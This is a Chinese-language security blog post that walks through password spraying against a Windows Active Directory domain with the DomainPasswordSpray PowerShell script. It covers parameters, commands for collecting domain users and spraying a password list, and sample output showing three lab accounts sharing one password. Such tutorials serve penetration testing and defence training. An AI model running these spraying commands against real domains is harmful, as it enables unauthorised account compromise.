<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Windows域渗透 - 用户密码枚举 - 倾旋的博客</title><meta name=theme-color><meta name=description content="0x00 前言
在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？
0x01 Powershell
目前已经有很多Powershell集合脚本，用于域渗透简直舒爽
今天推荐一款名字叫DomainPasswordSpray.ps1的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。

GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray
由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。

优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt
0x02 参数说明
在代码的开头就已经有介绍了，我简单汉化一下。
描述：该模块主要用于从域中收集用户列表。

参数： Domain 指定要测试的域名
参数： RemoveDisabled 尝试从用户列表删除禁用的账户
参数： RemovePotentialLockouts 删除锁定账户
参数： UserList 自定义用户列表(字典)。 如果未指定，这将自动从域中获取
参数： Password 指定单个密码进行口令测试
参数： PasswordList 指定一个密码字典
参数： OutFile 将结果保存到某个文件
参数： Force 当枚举出第一个后继续枚举，不询问

0x03 使用说明
使用例子：
C:\PS> Get-DomainUserList
该命令将从域中收集用户列表。
C:\PS> Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中
C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
该命令将会从域环境中获取用户名，然后逐个以密码Winter2016进行认证枚举
C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt"><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="Windows域渗透 - 用户密码枚举"><meta itemprop=description content="推荐一个Powershell脚本"><meta itemprop=datePublished content="2018-05-02T00:00:00+00:00"><meta itemprop=dateModified content="2018-05-02T00:00:00+00:00"><meta itemprop=wordCount content="300"><meta itemprop=keywords content="内网渗透"><meta property="og:url" content="https://payloads.online/archivers/2018-05-02/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="Windows域渗透 - 用户密码枚举"><meta property="og:description" content="推荐一个Powershell脚本"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-05-02T00:00:00+00:00"><meta property="article:modified_time" content="2018-05-02T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Windows域渗透 - 用户密码枚举"><meta name=twitter:description content="推荐一个Powershell脚本"><link rel=canonical href=https://payloads.online/archivers/2018-05-02/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">Windows域渗透 - 用户密码枚举</h1><div class="text-xs antialiased opacity-60"><time>May 2, 2018</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><h2 id=0x00-前言>0x00 前言</h2><p>在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？</p><h2 id=0x01-powershell>0x01 Powershell</h2><p>目前已经有很多Powershell集合脚本，用于域渗透简直舒爽</p><p>今天推荐一款名字叫<code>DomainPasswordSpray.ps1</code>的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。</p><p><img src=https://images.payloads.online/23ba8e1a-4f5f-11ec-bac7-00d861bf4abb.png alt=0x00></p><p><strong>GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray</strong></p><p>由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。</p><p><img src=https://images.payloads.online/23f92d78-4f5f-11ec-a331-00d861bf4abb.png alt=0x01></p><p><strong>优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</strong></p><h2 id=0x02-参数说明>0x02 参数说明</h2><p>在代码的开头就已经有介绍了，我简单汉化一下。</p><p>描述：该模块主要用于从域中收集用户列表。</p><ul><li>参数： <code>Domain</code> 指定要测试的域名</li><li>参数： <code>RemoveDisabled</code> 尝试从用户列表删除禁用的账户</li><li>参数： <code>RemovePotentialLockouts</code> 删除锁定账户</li><li>参数： <code>UserList</code> 自定义用户列表(字典)。 如果未指定，这将自动从域中获取</li><li>参数： <code>Password</code> 指定单个密码进行口令测试</li><li>参数： <code>PasswordList</code> 指定一个密码字典</li><li>参数： <code>OutFile</code> 将结果保存到某个文件</li><li>参数： <code>Force</code> 当枚举出第一个后继续枚举，不询问</li></ul><h2 id=0x03-使用说明>0x03 使用说明</h2><p>使用例子：</p><p><code>C:\PS> Get-DomainUserList</code></p><p>该命令将从域中收集用户列表。</p><p><code>C:\PS> Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</code></p><p>该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中</p><p><code>C:\PS> Invoke-DomainPasswordSpray -Password Winter2016</code></p><p>该命令将会从域环境中获取用户名，然后逐个以密码<code>Winter2016</code>进行认证枚举</p><p><code>C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt</code></p><p>该命令将会从<code>users.txt</code>中提取用户名，与<code>passlist.txt</code>中的密码对照成一对口令，进行域认证枚举，登录成功的结果将会输出到<code>sprayed-creds.txt</code></p><h2 id=0x04-实战>0x04 实战</h2><h3 id=获取域环境中的用户列表>获取域环境中的用户列表</h3><p><strong>命令：</strong><code>C:\PS> Get-DomainUserList | Out-File -Encoding ascii userlist.txt</code></p><p><strong>输出：</strong></p><pre tabindex=0><code>[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] There appears to be no lockout policy.
[*] There are 8 total users found.
[*] Created a userlist containing 8 users gathered from the current user&#39;s domain
</code></pre><p>获取的用户名：</p><pre tabindex=0><code>C:\PS&gt; type .\userlist.txt
Administrator
Guest
liyingzhe
krbtgt
Hack
testPass
webManager
dba
</code></pre><h3 id=密码枚举>密码枚举</h3><p><img src=https://images.payloads.online/243c3a28-4f5f-11ec-937a-00d861bf4abb.png alt=0x02></p><p><strong>命令：</strong> <code>C:\PS> Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt</code></p><p><strong>输出：</strong></p><pre tabindex=0><code>[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] There appears to be no lockout policy.
[*] Removing disabled users from list.
[*] There are 6 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 6 users gathered from the current user&#39;s domain
[*] Password spraying has begun. Current time is 18:45
[*] This might take a while depending on the total number of users
1 of 6 users tested2 of 6 users tested3 of 6 users tested[*] SUCCESS! User:testPass Password:w!23456
4 of 6 users tested[*] SUCCESS! User:webManager Password:w!23456
5 of 6 users tested[*] SUCCESS! User:dba Password:w!23456
6 of 6 users tested[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to sprayed-creds.txt
</code></pre><p>枚举的结果：</p><pre tabindex=0><code>C:\PS &gt; type .\sprayed-creds.txt
testPass:w!23456
webManager:w!23456
dba:w!23456
</code></pre></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2018-06-09/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2018-04-20/1/><span>新生活 - 上海，我来了</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>